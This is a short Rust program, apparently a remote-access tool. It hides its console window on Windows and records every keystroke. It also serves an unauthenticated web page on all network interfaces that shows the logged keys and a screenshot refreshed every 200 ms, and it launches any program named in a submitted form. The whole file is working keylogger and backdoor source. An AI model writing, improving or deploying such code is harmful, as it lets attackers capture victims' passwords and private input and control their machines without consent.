#![windows_subsystem = "windows"]
use axum::{
    Form, Router,
    http::{HeaderMap, HeaderValue},
    response::{Html, IntoResponse},
    routing::{get, post},
};
use rdev::listen;
use serde::Deserialize;
use std::io::{Cursor, Seek, SeekFrom};
use std::process::Command;
use std::sync::Arc;
use tokio::spawn;
use xcap::{Monitor, image::ImageFormat};
#[derive(Deserialize)]
struct Frm {
    area: String,
}
#[tokio::main]
async fn main() {
    let lock = Arc::new(std::sync::Mutex::new(String::new()));
    let lock1 = Arc::clone(&lock);
    let lock2 = Arc::clone(&lock);
    let lock3 = Arc::clone(&lock);
    let make_header = || {
        let mut head = HeaderMap::new();
        head.insert(
            "Cache-Control",
            HeaderValue::from_static("no-store, no-cache, must-revalidate, max-age=0"),
        );
        head.insert("Expires", HeaderValue::from_static("-1"));
        head.insert("Pragma", HeaderValue::from_static("no-cache"));
        head
    };
    spawn(async {
        let lockin = lock2;
        loop {
            let lockinin = lockin.clone();
            listen(move |e| *lockinin.lock().unwrap() += &e.name.unwrap_or(String::from("")))
                .unwrap();
        }
    });
    let root = async move || {
        let data = lock1.lock();
        (make_header(), Html(
            String::from(
                r#"<!DOCTYPE html><html><body><form action="/cmd" method="post"><textarea name="area"></textarea><input type="submit" value="提交" /></form><a href="/clear">清空</a><pre style="white-space: pre-wrap;">"#,
            ) + data.unwrap().as_str()
                + r#"</pre><img src="screen.bmp"/><script>setInterval(()=>{document.querySelector("img").src="/screen.bmp?"+Date.now()},200);</script></body></html>"#,
        )).into_response()
    };
    let cmd = async |Form(Frm { area })| {
        Command::new(area).spawn().unwrap();
        Html(
            r#"<!DOCTYPE html><html><body><script>window.location.href="/"</script></body></html>"#,
        )
    };
    let clear = async move || {
        lock3.lock().unwrap().clear();
        Html(
            r#"<!DOCTYPE html><html><body><script>window.location.href="/"</script></body></html>"#,
        )
    };
    let screen = async || {
        let mut buf = Cursor::new(Vec::new());
        let mnt = &Monitor::all().unwrap()[0];
        mnt.capture_image()
            .unwrap()
            .write_to(&mut buf, ImageFormat::Bmp)
            .unwrap();
        buf.seek(SeekFrom::Start(0)).unwrap();
        buf.into_inner()
    };
    let app = Router::new()
        .route("/", get(root))
        .route("/cmd", post(cmd))
        .route("/screen.bmp", get(screen))
        .route("/clear", get(clear));
    let lis = tokio::net::TcpListener::bind("0.0.0.0:1145").await.unwrap();
    axum::serve(lis, app).await.unwrap();
}
